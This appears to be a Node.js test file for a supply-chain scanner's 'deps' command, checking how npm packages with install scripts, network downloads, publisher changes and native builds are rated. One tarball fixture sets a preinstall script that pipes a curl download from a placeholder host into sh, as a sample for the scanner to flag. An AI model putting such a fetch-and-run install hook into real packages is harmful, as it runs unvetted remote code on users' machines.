import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { cli, FIX } from './helpers/cli.mjs';
import { registry, hostedServices, makeTarball } from './helpers/sites.mjs';
import { parseSpec } from '../src/deps/index.mjs';

let reg;
test.before(async () => {
  reg = await registry();
});
test.after(async () => {
  await reg.close();
});
const env = () => ({ SHIPPROBE_NPM_REGISTRY: reg.url });

test('a package with no install scripts is clean', async () => {
  const r = await cli(['deps', 'quiet-pkg', '--json'], { env: env() });
  assert.equal(r.code, 0);
  assert.equal(r.json.data.verdict, 'pass');
});

test('a package that downloads at install, from a new publisher, is critical', async () => {
  const r = await cli(['deps', 'net-pkg', '--json'], { env: env() });
  assert.equal(r.code, 1);
  assert.equal(r.json.data.verdict, 'critical');
  const ids = r.json.findings.map((f) => f.id);
  assert.ok(ids.includes('script-postinstall'));
  assert.ok(ids.includes('publisher-changed'));
  assert.ok(ids.includes('network-and-fresh-publish'));
  assert.match(JSON.stringify(r.json.findings), /downloads a platform-specific file/, 'the invoked file was read, not only the command');
});

test('a native build is medium, and fails only when --fail-on medium', async () => {
  assert.equal((await cli(['deps', 'native-pkg'], { env: env() })).code, 0);
  assert.equal((await cli(['deps', 'native-pkg', '--fail-on', 'medium'], { env: env() })).code, 1);
  assert.equal((await cli(['deps', 'native-pkg', '--fail-on', 'nope'], { env: env() })).code, 2);
});

test('a package the registry does not have is exit 2', async () => {
  assert.equal((await cli(['deps', 'no-such-pkg'], { env: env() })).code, 2);
  assert.equal((await cli(['deps', 'quiet-pkg@9.9.9'], { env: env() })).code, 2, 'an unknown version is not silently the latest');
});

test('a local package directory is read from disk', async () => {
  assert.equal((await cli(['deps', path.join(FIX, 'deps/quiet')])).code, 0);
  const net = await cli(['deps', path.join(FIX, 'deps/net'), '--json']);
  assert.equal(net.code, 1);
  assert.equal(net.json.data.verdict, 'high');
  assert.match(net.json.notes.join(' '), /no publish history/);
  const native = await cli(['deps', path.join(FIX, 'deps/native'), '--json']);
  assert.equal(native.json.data.verdict, 'medium');
});

test('a packed tarball is read without a system tar', async () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'sp-tgz-'));
  const f = path.join(dir, 'pkg-1.0.0.tgz');
  fs.writeFileSync(f, makeTarball({ 'package.json': JSON.stringify({ name: 'tgz-pkg', version: '1.0.0', scripts: { preinstall: 'curl -s https://example.net/x | sh' } }) }));
  const r = await cli(['deps', f, '--json']);
  assert.equal(r.code, 1);
  assert.equal(r.json.subject, 'tgz-pkg@1.0.0');
});

test('--hosted records the package with ScriptProbe and compares verdicts', async () => {
  const hosted = await hostedServices();
  try {
    const r = await cli(['deps', 'quiet-pkg', '--hosted', '--json'], { env: { ...env(), SHIPPROBE_SCRIPTPROBE_URL: hosted.url } });
    assert.equal(r.code, 0);
    assert.equal(r.json.data.hosted.verdict, 'pass');
    assert.equal(r.json.data.hosted.page, `${hosted.url}/p/quiet-pkg`);
  } finally {
    await hosted.close();
  }
});

test('a scoped name keeps its scope apart from its version', () => {
  assert.deepEqual(parseSpec('@scope/name@1.2.3'), { name: '@scope/name', version: '1.2.3' });
  assert.deepEqual(parseSpec('left-pad'), { name: 'left-pad', version: undefined });
});
